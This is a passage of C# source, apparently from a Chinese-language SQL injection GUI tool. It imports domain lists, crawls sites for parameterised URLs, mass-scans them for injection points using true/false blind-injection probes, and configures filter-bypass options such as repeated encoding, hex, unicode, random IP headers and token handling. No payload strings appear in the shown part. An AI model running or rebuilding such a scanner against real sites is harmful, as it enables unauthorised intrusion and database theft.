            this.txt_log.Invoke(new showLogDelegate(log), "没有发现盲注判断条件，请检查注入标记、编码等基础配置是否正确！", LogLevel.info);
        }

        private void inject_btn_autoFindKey_Click(object sender, EventArgs e)
        {
            try
            {
                if (config.request.IndexOf(setInjectStr) == -1)
                {

                    MessageBox.Show("大侠，请标记注入后，程序才能自动查找判断值！");
                    return;
                }
                if (config.request.IndexOf("<Encode>") == -1)
                {

                    MessageBox.Show("大侠，请将注入标记范围内参数标记编码，程序才能对标记编码范围内的数据进行URL编码，否则有错误！");
                    return;
                }
                this.inject_btn_autoFindKey.Enabled = false;
                ServerInfo trueServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, Comm.truePayload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                ServerInfo falseServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, Comm.falsePayload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                checkTheKey(trueServer, falseServer, trueServer);
                this.txt_log.Invoke(new showLogDelegate(log), "自动查找判断值完成！", LogLevel.info);

            }
            catch (Exception ep)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "自动查找判断值发生异常！" + ep.Message, LogLevel.error);
            }
            this.inject_btn_autoFindKey.Enabled = true;
        }

        private void scanInjection_importDomains_Click(object sender, EventArgs e)
        {
            if (addStatus == 0)
            {
                OpenFileDialog ofd = new OpenFileDialog { Filter = "文本文件(*.txt)|*.txt" };
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    this.scan_list.Clear();
                    this.scanInjection_txt_domainsPath.Text = ofd.FileName;
                    addStatus = 1;
                    Thread th = new Thread(new ParameterizedThreadStart(addItemToScanDomain));
                    th.Start(ofd.FileName);
                }
            }
            else
            {
                MessageBox.Show("加载任务未完成。");
            }
        }
        public int addStatus = 0;
        public void addItemToScanDomain(Object path)
        {
            this.scan_list = FileTool.readDomainToList(path.ToString(), true);
            this.scanInjection_domainsCount.Text = this.scan_list.Count + "";
            int i = 0;
            comm_count = this.scan_list.Count;
            foreach (String url in this.scan_list)
            {
                this.scanInject_lsb_links.Items.Add(url);
                i++;
                comm_currentCount = i;
            }
            addStatus = 0;
            MessageBox.Show("加载列表完成！");
        }

        public void stopScan()
        {
            status = -1;
            if (this.currentThread != null)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "发出停止线程信号！", LogLevel.info);
                stp.Cancel();
            }
           
            this.scanInjection_btn_scan.Enabled = false;
            this.scanInjection_btn_scan.Text = "正在停止...";
            while (stp.InUseThreads > 0)
            {
                Thread.Sleep(20);
            }
            this.scanInjection_btn_scan.Text = "开始扫描";
            this.scanInjection_btn_scan.Enabled = true;
            status = 0;
        }

        public void stopSpider()
        {
            status = -1;
            if (this.currentThread != null)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "发出停止线程信号！", LogLevel.info);
                stp.Cancel();
            }
          
            this.scanInjection_btn_spider.Enabled = false;
            this.scanInjection_btn_spider.Text = "正在停止...";
            while (stp.InUseThreads > 0)
            {
                Thread.Sleep(20);
            }
            this.scanInjection_btn_spider.Text = "爬行链接";
            this.scanInjection_domainsCount.Text = this.scanInject_lsb_links.Items.Count.ToString();
            this.scanInjection_btn_spider.Enabled = true;
            status = 0;
        }
        public void spider()
        {
            foreach (String url in scan_list)
            {
                //爬行
                stp.WaitFor(100);
                stp.QueueWorkItem<string>(spiderURLs, url);
            }
            stp.WaitForIdle();
            stopSpider();
        }
        public void scan()
        {
            //扫描
            HashSet<String> testURL = new HashSet<String>();
            foreach (String url in this.scanInject_lsb_links.Items)
            {
                if (url.IndexOf("?") != -1)
                {
                    if (!testURL.Contains(url))
                    {
                        testURL.Add(url);
                        stp.WaitFor(100);
                        stp.QueueWorkItem<string>(scanInject, url);
                    }
                    else
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), url + "----此URL以检测过了，自动跳过！", LogLevel.waring);
                    }
                }
            }
            stp.WaitForIdle();
            stopScan();
        }
        public int urlSumCount = 0;//待扫url
        public int scanedURLSCount = 0;//已扫

        public String GetOneURL(List<String> mylist, int index)
        {
            try
            {
                if (!String.IsNullOrEmpty(mylist[index]))
                {
                    return mylist[index];
                }
            }
            catch
            {

            }

            return "";
        }

        public void spiderURLs(object url)
        {
            try
            {
                Spider.config = config;
                Spider sp = new Spider();
                if (this.scanInect_chk_isSpider.Checked)
                {
                    sp.findLinks(url.ToString());
                }
                else
                {
                    sp.AllURL.Add(url.ToString());
                }
                int count = 0;
                int s = sp.AllURL.Count;//第一次URL总数
                int spindex = 0;//爬行下标
                int index = 0;
                HashSet<String> addURLs = new HashSet<String>();
                do
                {

                    if (index >= s)
                    {
                        //不够数量继续爬行
                        if (count < config.maxSpiderCount)
                        {
                            String surl = GetOneURL(sp.AllURL, spindex);
                            if (!String.IsNullOrEmpty(surl))
                            {
                                sp.findLinks(surl);
                                spindex++;
                            }
                        }
                    }

                    String curl = GetOneURL(sp.AllURL, index);
                    if (curl.IndexOf("?") != -1)
                    {
                        this.Invoke(new StringDelegate(addItemToListBox), curl);
                        count++;
                    }
                    index++;

                } while (count < config.maxScanCount && sp.AllURL.Count > spindex);

            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "发生异常----" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.scanedDomain);

        }


        public void scanInject(Object ourl)
        {
            Injection injection = InjectionTools.testInjection(ourl.ToString(), this.config, this.scanInect_chk_scanError.Checked);
            if (injection.isInjection)
            {
                this.txt_log.Invoke(new showLogDelegate(log), ourl + "存在注入点！", LogLevel.success);
                injectionURLCount++;
                injection.url = ourl.ToString();
                injection.index = injectionURLCount;
                this.Invoke(new addScanInjectionResultDelegate(addScanInjectionResult), injection);
            }
            else
            {
                this.txt_log.Invoke(new showLogDelegate(log), ourl + "不存在注入点！", LogLevel.info);
            }
            Interlocked.Increment(ref this.scanedURLSCount);

        }

        delegate void addScanInjectionResultDelegate(Injection inj);
        public void addScanInjectionResult(Injection inj)
        {

            ListViewItem lvi = new ListViewItem(inj.index + "");
            lvi.SubItems.Add(inj.url);
            lvi.SubItems.Add(inj.testUrl);
            lvi.SubItems.Add(inj.paramName);
            lvi.SubItems.Add(inj.injectType);
            lvi.SubItems.Add(inj.dbType);
            lvi.SubItems.Add(inj.remark);
            this.scanInjection_lvw_result.Items.Add(lvi);
        }

        public int scanedDomain = 0;
        private void timer_scanInjection_Tick(object sender, EventArgs e)
        {
            this.scanInjection_findURLSCount.Text = urlSumCount + "";
            this.scanInjection_scanedURLSCount.Text = scanedURLSCount + "";
            this.scanInjection_scanedDomainCount.Text = this.scanedDomain + "";
        }

        private void openScanURL(int index)
        {
            if (this.scanInjection_lvw_result.SelectedItems.Count == 0)
            {
                return;
            }
            string target = this.scanInjection_lvw_result.SelectedItems[0].SubItems[index].Text;

            try
            {

                System.Diagnostics.Process.Start("IEXPLORE.EXE", target);

            }
            catch (Exception oe)
            {
                MessageBox.Show("无法打开IE---" + oe.Message);
            }
        }



        private void scanInjection_lvw_result_DoubleClick(object sender, EventArgs e)
        {
            openScanURL(2);
        }

        private void scanInjection_cms_exportResult_Click(object sender, EventArgs e)
        {

            exportScanURL(null);
        }


        public void exportScanURL(int[] cols)
        {
            if (export == 0)
            {
                //保存文件
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Filter = "文本文件|*.txt";
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    export = 1;
                    exportInjectData(saveFileDialog.FileName, cols);
                }
            }
            else
            {

                MessageBox.Show("请稍候，还有导出任务正在进行！");
            }
            export = 0;
        }

        public void exportInjectData(Object path, int[] cols)
        {
            try
            {
                FileStream fs = new FileStream(path.ToString(), FileMode.OpenOrCreate, FileAccess.Write);
                StreamWriter sw = new StreamWriter(fs);
                String columns = "";
                if (cols == null)
                {
                    foreach (ColumnHeader dc in this.scanInjection_lvw_result.Columns)
                    {
                        columns += (dc.Text + "#");
                    }
                    sw.WriteLine(columns);
                }

                foreach (ListViewItem sv in this.scanInjection_lvw_result.Items)
                {
                    StringBuilder sb = new StringBuilder();
                    if (cols == null)
                    {
                        foreach (ListViewItem.ListViewSubItem subv in sv.SubItems)
                        {

                            sb.Append(subv.Text);
                            sb.Append("----");
                        }
                    }
                    else
                    {


                        for (int i = 0; i < cols.Length; i++)
                        {
                            sb.Append(sv.SubItems[cols[i]].Text);
                            sb.Append("----");
                        }
                    }

                    sb.Remove(sb.Length - 4, 4);
                    sw.WriteLine(sb.ToString());
                }
                sw.Close();
                MessageBox.Show("导出完成！");
            }
            catch (Exception e)
            {
                Tools.SysLog("导出数据发生异常！" + e.Message);
                MessageBox.Show("导出数据发生异常！");
            }
            export = 0;

        }

        private void scanInjection_cms_copyURL_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.scanInjection_lvw_result.SelectedItems.Count == 0)
                {
                    return;
                }
                Clipboard.SetText(this.scanInjection_lvw_result.SelectedItems[0].SubItems[1].Text);
                MessageBox.Show("复制成功！");
            }
            catch
            {
                MessageBox.Show("复制失败，可能粘贴板被其他软件占用！");
            }

        }

        private void scanInjection_cms_delThisLine_Click(object sender, EventArgs e)
        {
            if (this.scanInjection_lvw_result.SelectedItems.Count == 0)
            {
                return;
            }
            foreach (ListViewItem selitem in this.scanInjection_lvw_result.SelectedItems)
            {
                this.scanInjection_lvw_result.Items.Remove(selitem);
            }
        }

        private void scanInjection_cms_clearResult_Click(object sender, EventArgs e)
        {
            this.scanInjection_lvw_result.Items.Clear();
        }

        public void loadList(Object path)
        {
            //load
            FileStream fs_dir = null;
            StreamReader reader = null;
            urlSumCount = 0;
            try
            {
                fs_dir = new FileStream(path.ToString(), FileMode.Open, FileAccess.Read);

                reader = new StreamReader(fs_dir);

                String lineStr;

                while ((lineStr = reader.ReadLine()) != null)
                {
                    this.Invoke(new StringDelegate(addItemToListBox), lineStr);
                    urlSumCount++;
                }
            }
            catch (Exception e)
            {
                Tools.SysLog(e.Message);
            }
            finally
            {
                if (reader != null)
                {
                    reader.Close();
                }
                if (fs_dir != null)
                {
                    fs_dir.Close();
                }
                loadListStatus = 0;
            }

        }
        public void addItemToListBox(String item)
        {
            if (!this.scanInject_lsb_links.Items.Contains(item))
            {
                this.scanInject_lsb_links.Items.Add(item);
                urlSumCount++;
            }
        }

        private void scanInjection_txtURLList_DoubleClick(object sender, EventArgs e)
        {
            if (loadListStatus == 0)
            {
                OpenFileDialog ofd = new OpenFileDialog { Filter = "文本文件(*.txt)|*.txt" };
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    this.scanInject_lsb_links.Items.Clear();
                    Thread th = new Thread(loadList);
                    loadListStatus = 1;
                    th.Start(ofd.FileName);
                }
            }
            else
            {
                MessageBox.Show("上次导入任务还未结束，请稍后！");
            }
        }

        private void encode_txt_encode_TextChanged(object sender, EventArgs e)
        {
            md5();
        }

        private void md5()
        {
            if (this.encode_cbox_encode.SelectedIndex == 5)
            {
                this.encode_txt_result.Text = "16位md5：" + Tools.md5_16(this.encode_txt_input.Text) + "\r\n32位md5：" + Tools.md5_32(this.encode_txt_input.Text);
                this.encode_txt_result.Text += "\r\n小写16位md5：" + Tools.md5_16(this.encode_txt_input.Text).ToLower() + "\r\n小写32位md5：" + Tools.md5_32(this.encode_txt_input.Text).ToLower();
            }
        }

        private void log_lvw_httpLog_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (this.log_lvw_httpLog.SelectedItems.Count > 0)
            {
                try
                {
                    String tag = this.log_lvw_httpLog.SelectedItems[0].Tag.ToString();
                    this.log_txt_request.Text = FileTool.readFileToString(Tools.httpLogPath + tag + "-request.txt");
                    String response = FileTool.readFileToString(Tools.httpLogPath + tag + "-response.txt");
                    if (!String.IsNullOrEmpty(response))
                    {
                        int index = response.IndexOf("\r\n\r\n");

                        if (index != -1)
                        {
                            this.webBro_log.Stop();
                            this.webBro_log.ScriptErrorsSuppressed = true;
                            this.log_txt_response.Text = response;
                            String html = response.Substring(index, response.Length - index);
                            this.webBro_log.DocumentText = html;
                        }
                    }
                    else
                    {
                        MessageBox.Show("没有读到详细HTTP日志，可能上一次清除记录时已清除！");
                    }
                }
                catch (Exception ee)
                {
                    Tools.SysLog("查看详细HTTP日志，发生异常----" + ee.Message);
                }
            }
        }

        private ListViewColumnSorter data_dbs_lvw_lvwColumnSorter;
        private bool sort = false;
        private void data_dbs_lvw_data_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // 创建一个ListView排序类的对象，并设置listView1的排序器
            data_dbs_lvw_lvwColumnSorter = new ListViewColumnSorter();
            if (sort == false)
            {
                sort = true;
                data_dbs_lvw_lvwColumnSorter.Order = SortOrder.Descending;
            }
            else
            {
                sort = false;
                data_dbs_lvw_lvwColumnSorter.Order = SortOrder.Ascending;
            }
            data_dbs_lvw_lvwColumnSorter.SortColumn = e.Column;
            this.data_dbs_lvw_data.ListViewItemSorter = data_dbs_lvw_lvwColumnSorter;
        }

        private ListViewColumnSorter scanInjection_lvw_result_lvwColumnSorter;
        private bool ss_sort = false;
        private void scanInjection_lvw_result_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // 创建一个ListView排序类的对象，并设置listView1的排序器
            scanInjection_lvw_result_lvwColumnSorter = new ListViewColumnSorter();

            if (ss_sort == false)
            {
                ss_sort = true;
                scanInjection_lvw_result_lvwColumnSorter.Order = SortOrder.Descending;
            }
            else
            {
                ss_sort = false;
                scanInjection_lvw_result_lvwColumnSorter.Order = SortOrder.Ascending;
            }
            scanInjection_lvw_result_lvwColumnSorter.SortColumn = e.Column;
            this.scanInjection_lvw_result.ListViewItemSorter = scanInjection_lvw_result_lvwColumnSorter;
        }

        private void btn_inject_clearRequest_Click(object sender, EventArgs e)
        {
            this.mytab.SelectTab(1);
            data_cms_tsmi_getVariable_Click(null, null);
        }

        private void file_txt_result_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
            {
                ((TextBox)sender).SelectAll();
            }
        }

        private void cmd_txt_result_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
            {
                ((TextBox)sender).SelectAll();
            }
        }

        private void encode_txt_result_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
            {
                ((TextBox)sender).SelectAll();
            }
        }

        private void data_dbs_tsmi_addDBS_Click(object sender, EventArgs e)
        {
            addNode(1);

        }

        private void addNode(int type)
        {

            if (an != null)
            {
                an = new AddNode();
                an.type = type;
                an.tn = this.data_tvw_dbs.SelectedNode;
                an.tvw = this.data_tvw_dbs;
                an.ShowDialog();
            }
            else
            {
                an = new AddNode();
                an.type = type;
                an.tvw = this.data_tvw_dbs;
                an.tn = this.data_tvw_dbs.SelectedNode;
                an.ShowDialog();
            }

        }

        private void data_dbs_tsmi_addTableOrColumn_Click(object sender, EventArgs e)
        {
            addNode(2);
        }

        private void scanInjection_btn_spider_Click(object sender, EventArgs e)
        {
            if (addStatus != 0)
            {
                MessageBox.Show("请稍候，还在加载地址列表！");
                return;
            }
            if (this.scanInjection_btn_spider.Text.Equals("爬行链接"))
            {
                if (scan_list.Count <= 0)
                {
                    MessageBox.Show("请导入域名！");
                    return;
                }
                if (stp.InUseThreads > 0)
                {
                    MessageBox.Show("请稍候还有后台线程正在运行！");
                    return;
                }
                this.scanInject_lsb_links.Items.Clear();
                currentThread = new Thread(spider);
                scanedDomain = 0;
                this.scanInjection_btn_spider.Text = "停止爬行";
                currentThread.Start();

            }

            else
            {
                if (this.currentThread != null)
                {
                    Thread t = new Thread(stopSpider);
                    t.Start();
                }
            }
        }

        private void scanInjection_btn_scan_Click(object sender, EventArgs e)
        {
            if (addStatus != 0)
            {
                MessageBox.Show("请稍候，还在加载地址列表！");
                return;
            }
            if (stp.InUseThreads <= 0)
            {
                if (this.scanInject_lsb_links.Items.Count > 0)
                {

                    scanedURLSCount = 0;
                    this.scanInjection_btn_scan.Text = "停止扫描";
                    currentThread = new Thread(scan);
                    currentThread.Start();
                }
                else
                {
                    MessageBox.Show("请先爬行或导入链接！");
                }
            }
            else
            {

                if (this.currentThread != null)
                {
                    Thread t = new Thread(stopScan);
                    t.Start();
                }
            }
        }
        private ListViewColumnSorter log_lvw_httpLog_lvwColumnSorter;
        private bool log_sort = false;
        private void log_lvw_httpLog_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // 创建一个ListView排序类的对象，并设置listView1的排序器
            log_lvw_httpLog_lvwColumnSorter = new ListViewColumnSorter();
            if (log_sort == false)
            {
                log_sort = true;
                log_lvw_httpLog_lvwColumnSorter.Order = SortOrder.Descending;
            }
            else
            {
                log_sort = false;
                log_lvw_httpLog_lvwColumnSorter.Order = SortOrder.Ascending;
            }
            log_lvw_httpLog_lvwColumnSorter.SortColumn = e.Column;
            this.log_lvw_httpLog.ListViewItemSorter = log_lvw_httpLog_lvwColumnSorter;
        }

        private void cbox_basic_timeOut_TextChanged(object sender, EventArgs e)
        {
            config.timeOut = int.Parse(this.cbox_basic_timeOut.Text);
        }

        private void cbox_basic_encoding_TextChanged(object sender, EventArgs e)
        {
            config.encoding = this.cbox_basic_encoding.Text;
        }

        private void cbox_basic_threadSize_TextChanged(object sender, EventArgs e)
        {
            config.threadSize = int.Parse(this.cbox_basic_threadSize.Text);
            stp.MaxThreads = config.threadSize;
        }

        private void cbox_basic_reTryCount_TextChanged(object sender, EventArgs e)
        {
            config.reTry = int.Parse(this.cbox_basic_reTryCount.Text);
        }

        private void tsmi_exportScanInjectionURL_Click(object sender, EventArgs e)
        {
            try
            {
                //保存文件
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Filter = "文本文件|*.txt";
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    FileStream fs = new FileStream(saveFileDialog.FileName.ToString(), FileMode.OpenOrCreate, FileAccess.Write);
                    StreamWriter sw = new StreamWriter(fs);
                    foreach (String url in this.scanInject_lsb_links.Items)
                    {
                        sw.WriteLine(url);
                    }
                    sw.Close();
                    MessageBox.Show("导出完成！");
                }

            }
            catch (Exception ee)
            {

                MessageBox.Show("导出异常！" + ee.Message);

            }

        }

        private void tsmi_clearScanInjectionURL_Click(object sender, EventArgs e)
        {
            this.scanInject_lsb_links.Items.Clear();
            this.scan_list.Clear();
            this.scanInjection_domainsCount.Text = "0";
            this.urlSumCount = 0;//待扫url
            this.scanedURLSCount = 0;//已扫
            this.scanedDomain = 0;//爬行到URL

        }

        private void encode_txt_input_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
            {
                ((TextBox)sender).SelectAll();
            }
        }

        private void tsmi_readme_Click(object sender, EventArgs e)
        {
            MessageBox.Show("查看程序包！");
        }

        private void cbox_file_readFileEncoding_SelectedValueChanged(object sender, EventArgs e)
        {
            config.readFileEncoding = this.cbox_file_readFileEncoding.Text;
        }

        private void toolStrip1_TextChanged(object sender, EventArgs e)
        {
            config.db_encoding = this.data_dbs_cob_db_encoding.Text;
        }

        private void 版本ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("V1.0正式版----" + version);
        }

        private void data_dbs_tsmi_saveDTCStruct_Click(object sender, EventArgs e)
        {
            try
            {
                DataBase dbs = new DataBase();
                SerializableDictionary<String, SerializableDictionary<String, List<String>>> db_tables = new SerializableDictionary<String, SerializableDictionary<String, List<String>>>();
                foreach (TreeNode db in this.data_tvw_dbs.Nodes)
                {
                    SerializableDictionary<String, List<String>> stable = new SerializableDictionary<String, List<String>>();
                    if (db.Nodes.Count <= 0)
                    {
                        stable.Add("", new List<String>());
                    }
                    foreach (TreeNode table in db.Nodes)
                    {
                        List<String> columns = new List<String>();
                        foreach (TreeNode column in table.Nodes)
                        {
                            columns.Add(column.Text);
                        }
                        stable.Add(table.Text, columns);
                    }
                    db_tables.Add(db.Text, stable);
                }
                dbs.tables = db_tables;
                //保存文件
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Filter = "文本文件|*.xml";
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    export = 1;
                    Thread eth = new Thread(exportData);
                }
                XML.saveDBS(saveFileDialog.FileName, dbs);
                MessageBox.Show("保存成功！");
            }
            catch (Exception ke)
            {

                log("\r\n加载异常----" + ke.Message + "\r\n", LogLevel.error);
            }
        }

        private void data_dbs_tsmi_loadDTCStruct_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog ofd = new OpenFileDialog { Filter = "XML文件(*.xml)|*.*" };
                if (ofd.ShowDialog() == DialogResult.OK)
                {

                    DataBase dbs = XML.readDBS(ofd.FileName);
                    foreach (KeyValuePair<String, SerializableDictionary<String, List<String>>> sdb in dbs.tables)
                    {
                        if (Tools.isExistsNode(this.data_tvw_dbs.Nodes, sdb.Key))
                        {
                            log("数据库" + sdb.Key + "已在列表中，无法再次添加如果要添加请先删除原数据库！", LogLevel.waring);
                            continue;
                        }
                        TreeNode dbtn = new TreeNode(sdb.Key);
                        dbtn.Tag = "dbs";
                        foreach (KeyValuePair<String, List<String>> tables in sdb.Value)
                        {
                            if (String.IsNullOrEmpty(tables.Key))
                            {
                                continue;
                            }
                            TreeNode tabletn = new TreeNode(tables.Key);
                            tabletn.Tag = "table";
                            dbtn.Nodes.Add(tabletn);
                            foreach (String column in tables.Value)
                            {
                                if (String.IsNullOrEmpty(column))
                                {
                                    continue;
                                }
                                TreeNode columntn = new TreeNode(column);
                                columntn.Tag = "column";
                                tabletn.Nodes.Add(columntn);
                            }
                        }
                        this.data_tvw_dbs.Nodes.Add(dbtn);
                    }
                    MessageBox.Show("加载库表列信息成功！");
                }
            }
            catch (Exception ke)
            {

                log("\r\n加载异常----" + ke.Message + "\r\n", LogLevel.error);
            }
        }

        private void data_dbs_tsmi_clearDTCStruct_Click(object sender, EventArgs e)
        {
            this.data_tvw_dbs.Nodes.Clear();
        }

        private void cbox_inject_type_SelectedIndexChanged(object sender, EventArgs e)
        {
            int c = this.cbox_inject_type.SelectedIndex;
            config.keyType = (KeyType)c;
        }

        private void tsmi_createGetTemplate_Click(object sender, EventArgs e)
        {
            this.txt_inject_request.Text = HTTP.getTemplate;
        }

        private void tsmi_createPOSTTemplate_Click(object sender, EventArgs e)
        {
            this.txt_inject_request.Text = HTTP.postTemplate;
        }

        private void tsmi_changeRequestMethod_Click(object sender, EventArgs e)
        {
            this.txt_inject_request.Text = Tools.changeRequestMethod(this.txt_inject_request.Text);
        }

        private void tsmi_clearColumns_Click(object sender, EventArgs e)
        {
            this.data_dbs_lvw_data.Clear();
        }

        private void tsmi_bugReport_Click(object sender, EventArgs e)
        {
            MessageBox.Show("邮箱反馈：1341413415@qq.com\r\nQQ群反馈：84978967");
        }

        private void data_dbs_cob_db_encoding_TextChanged(object sender, EventArgs e)
        {
            this.config.db_encoding = this.data_dbs_cob_db_encoding.Text;
        }

        private void cob_keyRepalce_SelectedIndexChanged(object sender, EventArgs e)
        {
            config.keyReplace = this.cob_keyRepalce.SelectedIndex;
        }

        private void chk_reaplaceBeforURLEncode_CheckedChanged(object sender, EventArgs e)
        {
            config.reaplaceBeforURLEncode = this.chk_reaplaceBeforURLEncode.Checked;
        }

        private void tsmi_createPackByURL_Click(object sender, EventArgs e)
        {
            try
            {
                if (config.request.StartsWith("https"))
                {
                    this.chk_useSSL.Checked = true;
                }
                else
                {
                    this.chk_useSSL.Checked = false;
                }
                Uri url = new Uri(config.request);
                this.txt_inject_request.Text = Spider.reqestGetTemplate.Replace("{url}", url.PathAndQuery).Replace("{host}", url.Host);
                this.txt_basic_host.Text = url.Host;
                this.txt_basic_port.Text = url.Port.ToString();

            }
            catch
            {
                MessageBox.Show("请在数据包中输入正确的URL地址，如：http://www.baidu.com/index.php?id=1");
            }

        }

        private void tsmi_tsmi_opentestURL_Click(object sender, EventArgs e)
        {
            openScanURL(2);
        }

        private void tsmi_openURL_Click(object sender, EventArgs e)
        {
            openScanURL(1);
        }

        private void bypass_btn_saveTemplate_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "XML文件|*.xml";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                XML.saveConfig(saveFileDialog.FileName, config);
                MessageBox.Show("保存模板成功！");
            }
        }

        public void loadTemplate(String templatePath)
        {
            try
            {
                Config template = XML.readConfig(templatePath);

                //bypass
                this.bypass_chk_inculdeStr.Checked = template.inculdeStr;
                this.bypass_hex.Checked = config.usehex;
                this.cbox_bypass_urlencode_count.SelectedIndex = config.urlencodeCount - 1;
                this.cob_keyRepalce.SelectedIndex = template.keyReplace;
                this.cbox_base64Count.SelectedIndex = config.base64Count;
                this.bypass_chk_usebetween.Checked = config.useBetweenByPass;
                this.bypass_chk_use_unicode.Checked = config.useUnicode;

                //替换字符
                this.chk_reaplaceBeforURLEncode.Checked = template.reaplaceBeforURLEncode;
                String[] replaceStrs = Regex.Split(template.replaceStrs, "\\n");
                if (replaceStrs.Length > 0)
                {
                    foreach (String line in replaceStrs)
                    {
                        String[] strs = Regex.Split(line, "\\t");
                        if (strs.Length == 2)
                        {
                            if (!String.IsNullOrEmpty(strs[0]) && !replaceList.ContainsKey(strs[0]))
                            {
                                this.replaceList.Add(strs[0], strs[1]);
                                ListViewItem lvi = new ListViewItem(strs[0]);
                                lvi.SubItems.Add(strs[1]);
                                lvi.Name = strs[1];
                                this.bypass_lvw_replaceString.Items.Add(lvi);
                                config.replaceStrs += (strs[0] + "\t" + strs[1] + "\n");
                            }
                        }
                    }
                }


                this.bypass_cbox_sendHTTPSleepTime.Text = config.sendHTTPSleepTime + "";
                this.bypass_cbox_randIPToHeader.Text = config.randIPToHeader;

                MessageBox.Show("加载模板完成！");

            }
            catch (Exception e)
            {
                Tools.SysLog("加载模板发生异常！" + e.Message);
                MessageBox.Show("加载模板发生异常！");
            }
        }


        public void showHTTPLog(String index, ServerInfo server, String payload, String proxyInfo)
        {
            this.txt_log.Invoke(new sendHTTPLogDelegate(sendHTTPLog), index, server, payload, proxyInfo);
        }
        public void showLog(String msg, LogLevel level)
        {
            this.txt_log.Invoke(new showLogDelegate(log), msg, level);
        }

        private void bypass_cbox_loadTemplate_TextChanged(object sender, EventArgs e)
        {
            if (this.bypass_cbox_loadTemplate.SelectedIndex == 0)
            {
                OpenFileDialog ofd = new OpenFileDialog { Filter = "XML文件(*.xml)|*.*" };
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    loadTemplate(ofd.FileName);
                }
            }
            else
            {
                String path = AppDomain.CurrentDomain.BaseDirectory + "/config/template/" + this.bypass_cbox_loadTemplate.Text;
                loadTemplate(path);

            }
        }

        private void cbox_base64Count_TextChanged(object sender, EventArgs e)
        {
            config.base64Count = this.cbox_base64Count.SelectedIndex + 1;
        }

        private void tsmi_tsmi_exortTestURL_Click(object sender, EventArgs e)
        {
            exportScanURL(new int[] { 2 });
        }

        private void tsmi_tsmi_exortOldURL_Click(object sender, EventArgs e)
        {
            exportScanURL(new int[] { 1 });
        }

        private void cbox_bypass_urlencode_count_TextChanged(object sender, EventArgs e)
        {
            config.urlencodeCount = this.cbox_bypass_urlencode_count.SelectedIndex + 1;
        }

        private void bypass_chk_usebetween_CheckedChanged(object sender, EventArgs e)
        {
            config.useBetweenByPass = this.bypass_chk_usebetween.Checked;
        }

        private void btn_inject_get_token_config_Click(object sender, EventArgs e)
        {
            this.mytab.SelectTab(4);
        }
        private void testGetToke()
        {

            if (this.token_txt_http_request.Text.Length <= 0)
            {
                MessageBox.Show("未设置获取Token随机值的HTTP请求数据包！");
                return;
            }

            ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, "", config.token_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

            MessageBox.Show("获取到Token值为：" + Tools.substr(server.body, this.token_txt_startStr.Text, this.token_txt_endStr.Text));
        }
        private void token_btn_testGetToken_Click(object sender, EventArgs e)
        {
            Thread t = new Thread(testGetToke);
            t.Start();
        }

        private void token_txt_http_request_TextChanged(object sender, EventArgs e)
        {
            config.token_request = this.token_txt_http_request.Text;
        }

        private void token_txt_startStr_TextChanged(object sender, EventArgs e)
        {
            config.token_startStr = this.token_txt_startStr.Text;
        }

        private void token_txt_endStr_TextChanged(object sender, EventArgs e)
        {
            config.token_endStr = this.token_txt_endStr.Text;
        }


        private void btn_inject_setTokenLocation_Click(object sender, EventArgs e)
        {
            this.txt_inject_request.SelectedText = "<Token>" + this.txt_inject_request.SelectedText + "</Token>";
        }

        private void btn_inject_randStr_Click(object sender, EventArgs e)
        {
            this.txt_inject_request.SelectedText = "<Rand>" + this.txt_inject_request.SelectedText + "</Rand>";
        }

        private void txt_sencond_request_TextChanged(object sender, EventArgs e)
        {
            config.sencondRequest = this.txt_sencond_request.Text;
        }

        private void bypass_hex_CheckedChanged(object sender, EventArgs e)
        {
            config.usehex = this.bypass_hex.Checked;
        }

        private void cbox_base64Count_SelectedIndexChanged(object sender, EventArgs e)
        {
            config.base64Count = this.cbox_base64Count.SelectedIndex;
        }

        private void token_txt_http_request_KeyDown(object sender, KeyEventArgs e)
        {
            selectAll(sender, e);
        }

        private void txt_sencond_request_KeyDown(object sender, KeyEventArgs e)
        {
            selectAll(sender, e);
        }

        private void chk_sencondInject_CheckedChanged(object sender, EventArgs e)
        {
            config.sencondInject = this.chk_sencondInject.Checked;
        }

        private void bypass_chk_use_unicode_CheckedChanged(object sender, EventArgs e)
        {
            config.useUnicode = this.bypass_chk_use_unicode.Checked;
        }

